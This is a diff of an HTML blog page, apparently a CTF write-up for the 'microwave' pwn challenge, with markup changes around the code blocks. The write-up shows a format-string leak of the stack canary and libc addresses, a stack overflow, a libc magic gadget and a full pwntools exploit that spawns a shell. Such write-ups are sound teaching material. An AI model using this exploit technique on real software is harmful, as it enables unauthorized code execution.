@@ -70,7 +70,7 @@ and tweets your favorite food.</p>
 <li>(4) <em>Exit</em></li>
 </ul>
 <p>Connect to twitter:</p>
-<div class="highlight"><pre><span></span> --------------------------------------------------------
+<div class="highlight"><pre><span></span><code> --------------------------------------------------------
  |     Welcome to the next generation of MicroWaves!    |
  |                         ***                          |
  | This stylish Microwave with Grill function, includes |
@@ -93,11 +93,10 @@ and tweets your favorite food.</p>
 Checking test
 Twitter account
 ...
-</pre></div>
-
+</code></pre></div>
 
 <p>Edit your tweet:</p>
-<div class="highlight"><pre><span></span>           ----------------------------------
+<div class="highlight"><pre><span></span><code>           ----------------------------------
            |  1. Connect to Twitter account |
            |  2. Edit your tweet            |
            |  3. Grill &amp; Tweet your food    |
@@ -109,11 +108,10 @@ Twitter account
            #&gt; some blabla
 
            Done.
-</pre></div>
-
+</code></pre></div>
 
 <p>Grill and tweet:</p>
-<div class="highlight"><pre><span></span>           ----------------------------------
+<div class="highlight"><pre><span></span><code>           ----------------------------------
            |  1. Connect to Twitter account |
            |  2. Edit your tweet            |
            |  3. Grill &amp; Tweet your food    |
@@ -126,11 +124,10 @@ Twitter account
 
   Okay! Let&#39;s do this!
 ...
-</pre></div>
-
+</code></pre></div>
 
 <p>Here are the protections of the binary</p>
-<div class="highlight"><pre><span></span>$ checksec microwave_61f50dba931bb10ab3089215b2e188f4
+<div class="highlight"><pre><span></span><code>$ checksec microwave_61f50dba931bb10ab3089215b2e188f4
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/tmp/microwave_61f50dba931bb10ab3089215b2e188f4&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -138,8 +135,7 @@ Twitter account
     NX:       NX enabled
     PIE:      PIE enabled
     FORTIFY:  Enabled
-</pre></div>
-
+</code></pre></div>
 
 <h2>The vulnerabilities</h2>
 <h3>Find the password</h3>
@@ -147,7 +143,7 @@ Twitter account
 twitter account. The username can be anything, however the function
 containing the <em>Checking</em> string shows where the password is checked
 (and what it is):</p>
-<div class="highlight"><pre><span></span>[0x00000ac0]&gt; iz | grep Checking
+<div class="highlight"><pre><span></span><code>[0x00000ac0]&gt; iz | grep Checking
 [0x00000ac0]&gt; axt 0x00002ac0
 data 0xf03 lea rsi, [rip + 0x1bb6] in sub.__printf_chk_f00
 [0x00000ac0]&gt; pd @0xf03
@@ -181,15 +177,14 @@ data 0xf03 lea rsi, [rip + 0x1bb6] in sub.__printf_chk_f00
 `---&gt; 0x00000fe8      31d2           xor edx, edx
  ||   0x00000fea      6689553c       mov word [rbp+arg_3ch], dx  ; [0x3c:2]=27 ; &#39;&lt;&#39; // RETURN VALUE 0
  |`=&lt; 0x00000fee      ebdc           jmp 0xfcc
-</pre></div>
-
+</code></pre></div>
 
 <p>The password is thus <code>n07_7h3_fl46</code>.
 It was however possible to "see" it using a simple <code>strings</code>.</p>
 <h3>Vuln1: string format</h3>
 <p>The first vulnerability is a string format on the username when
 connecting to twitter:</p>
-<div class="highlight"><pre><span></span> --------------------------------------------------------
+<div class="highlight"><pre><span></span><code> --------------------------------------------------------
  <span class="p">|</span>     Welcome to the next generation of MicroWaves!    <span class="p">|</span>
  <span class="p">|</span>                         ***                          <span class="p">|</span>
  <span class="p">|</span> This stylish Microwave with Grill <span class="k">function</span>, includes <span class="p">|</span>
@@ -212,8 +207,7 @@ connecting to twitter:</p>
 Checking 0xa.0x7ffff7b0ce50.0x7ffff7fd8700.0x555555556ac0.<span class="o">(</span>nil<span class="o">)</span>.0xeaa546f902a74f00.0x7ffff7dd7710.0x7ffff7dd7718
 Twitter account
 ............
-</pre></div>
-
+</code></pre></div>
 
 <p>It is thus possible to read up the stack. The leaked values are indeed interesting
 and will be used later:</p>
@@ -224,7 +218,7 @@ and will be used later:</p>
 <h3>Vuln2: stack overflow</h3>
 <p>The second vulnerability is triggered when reading the content to tweet.
 It reads from stdin (0) and store the result on the stack</p>
-<div class="highlight"><pre><span></span>[0x00000ac0]&gt; iz | grep &#39;#&gt;&#39;
+<div class="highlight"><pre><span></span><code>[0x00000ac0]&gt; iz | grep &#39;#&gt;&#39;
 vaddr=0x00002adb paddr=0x00002adb ordinal=019 sz=16 len=15 section=.rodata type=ascii string=\n           #&gt;
 [0x00000ac0]&gt; axt 0x00002adb
 data 0x1007 lea rsi, [rip + 0x1acd] in sub.__printf_chk_0
@@ -236,13 +230,12 @@ data 0x1007 lea rsi, [rip + 0x1acd] in sub.__printf_chk_0
 0x0000103c      31c0           xor eax, eax
 0x0000103e      e8ddf9ffff     call sym.imp.read
 ...
-</pre></div>
-
+</code></pre></div>
 
 <p>We read up to 0x800 (2048) from stdin to the buffer (on the stack).
 If we consider the whole block, only 0x418 (1048) are reserved
 on the stack. We can thus overwrite saved RIP</p>
-<div class="highlight"><pre><span></span>sub rsp, 0x418                  | reserve 1048
+<div class="highlight"><pre><span></span><code>sub rsp, 0x418                  | reserve 1048
 lea rsi, [rip + 0x1acd]         |
 mov edi, 1                      |
 mov rax, qword fs:[0x28]        | get the canary
@@ -261,8 +254,7 @@ call sym.imp.puts ;[d]          |
 mov rax, qword [rsp + 0x408]    |
 xor rax, qword fs:[0x28]        |
 jne 0x106a ;[e]
-</pre></div>
-
+</code></pre></div>
 
 <p>So to overflow saved RIP, the payload should look like this:</p>
 <ul>
@@ -275,15 +267,14 @@ jne 0x106a ;[e]
 <p>Due to the protections, one needs to exploit the binary using ROP.
 However looking into the provided libc shows that the <em>magic</em> ROP chain
 is present.</p>
-<div class="highlight"><pre><span></span>.text:000000000004652C mov     rax, cs:environ_ptr_0
+<div class="highlight"><pre><span></span><code>.text:000000000004652C mov     rax, cs:environ_ptr_0
 .text:0000000000046533 lea     rdi, aBinSh     ; &quot;/bin/sh&quot;
 .text:000000000004653A lea     rsi, [rsp+180h+var_150]
 .text:000000000004653F mov     cs:dword_3C06C0, 0
 .text:0000000000046549 mov     cs:dword_3C06D0, 0
 .text:0000000000046553 mov     rdx, [rax]
 .text:0000000000046556 call    execve
-</pre></div>
-
+</code></pre></div>
 
 <p>So by overwriting saved-RIP with that address (libc base address + 0x4652C)
 we get RCE (execve of "/bin/sh").</p>
@@ -301,7 +292,7 @@ the base address these are in order to
 retrieve the base address. This base address is then used to refer to the
 magic gadget.</p>
 <p>This is easily done with gdb:</p>
-<div class="highlight"><pre><span></span>$ gdb microwave_61f50dba931bb10ab3089215b2e188f4
+<div class="highlight"><pre><span></span><code>$ gdb microwave_61f50dba931bb10ab3089215b2e188f4
 gdb-peda$ <span class="nb">set</span> environment <span class="nv">LD_PRELOAD</span><span class="o">=</span>./libc.so.6
 gdb-peda$ r
 Starting program: /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
@@ -360,13 +351,12 @@ Start              End                Perm  Name
 0x00007ffff7ffe000 0x00007ffff7fff000 rw-p  mapped
 0x00007ffffffde000 0x00007ffffffff000 rw-p  <span class="o">[</span>stack<span class="o">]</span>
 0xffffffffff600000 0xffffffffff601000 r-xp  <span class="o">[</span>vsyscall<span class="o">]</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>The offset is thus <code>hex(0x7ffff7b02870 - 0x00007ffff7a17000) = 0xeb870</code></p>
 <p>Now constructing the exploit using <a href="https://github.com/Gallopsled/pwntools">pwntools</a>.</p>
 <p>Exploit:</p>
-<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python2</span>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python2</span>
 <span class="c1"># author: deadc0de6</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
@@ -379,7 +369,7 @@ Start              End                Perm  Name
 <span class="c1">#p = remote(&#39;microwave.insomni.hack&#39;, 1337)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
 
-<span class="k">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[MicroWave]: &#39;</span><span class="p">)</span>
+<span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[MicroWave]: &#39;</span><span class="p">)</span>
 
 <span class="c1"># select (1) connect</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
@@ -394,7 +384,7 @@ Start              End                Perm  Name
 <span class="c1"># read leaked addresses</span>
 <span class="n">ret</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[MicroWave]: &#39;</span><span class="p">)</span>
 <span class="n">addrs</span> <span class="o">=</span> <span class="n">ret</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">addrs</span>
+<span class="nb">print</span> <span class="n">addrs</span>
 
 <span class="c1"># canary is the sixth element</span>
 <span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">addrs</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
@@ -404,13 +394,13 @@ Start              End                Perm  Name
 <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libcaddr</span> <span class="o">-</span> <span class="n">base_offset</span>
 
 <span class="c1"># print some information</span>
-<span class="k">print</span> <span class="s1">&#39;canary is </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
-<span class="k">print</span> <span class="s2">&quot;libc base: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
-<span class="k">print</span> <span class="s2">&quot;magic addr: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">magic_addr</span><span class="p">))</span>
+<span class="nb">print</span> <span class="s1">&#39;canary is </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+<span class="nb">print</span> <span class="s2">&quot;libc base: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+<span class="nb">print</span> <span class="s2">&quot;magic addr: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">magic_addr</span><span class="p">))</span>
 
 <span class="c1"># select (2) send tweet</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;#&gt; &quot;</span><span class="p">)</span>
+<span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;#&gt; &quot;</span><span class="p">)</span>
 
 <span class="c1"># construct the exploit</span>
 <span class="n">buf</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">1032</span>
@@ -424,11 +414,10 @@ Start              End                Perm  Name
 
 <span class="c1"># interact with it</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>It is then possible to <code>cat</code> the flag.</p>
-<div class="highlight"><pre><span></span>$ ./microwave-pwn.py
+<div class="highlight"><pre><span></span><code>$ ./microwave-pwn.py
 <span class="o">[</span>+<span class="o">]</span> Opening connection to <span class="m">127</span>.0.0.1 on port <span class="m">1337</span>: Done
 
  --------------------------------------------------------
@@ -455,16 +444,14 @@ magic addr: 0x7f192237652c
 <span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
 $ ls
 ...
-</pre></div>
-
+</code></pre></div>
 
 <p>To reproduce the execution locally, I used socat with the following tweak:</p>
-<div class="highlight"><pre><span></span>$ cat doit.sh
+<div class="highlight"><pre><span></span><code>$ cat doit.sh
 <span class="c1">#!/bin/bash</span>
 <span class="nv">LD_PRELOAD</span><span class="o">=</span>./libc.so.6 ./microwave_61f50dba931bb10ab3089215b2e188f4
 $ socat tcp-l:1337,reuseaddr,fork exec:./doit.sh
-</pre></div>
-
+</code></pre></div>
 
 <h3>Note</h3>
 <p>On some systems, using <a href="http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html">LD_PRELOAD</a> won't
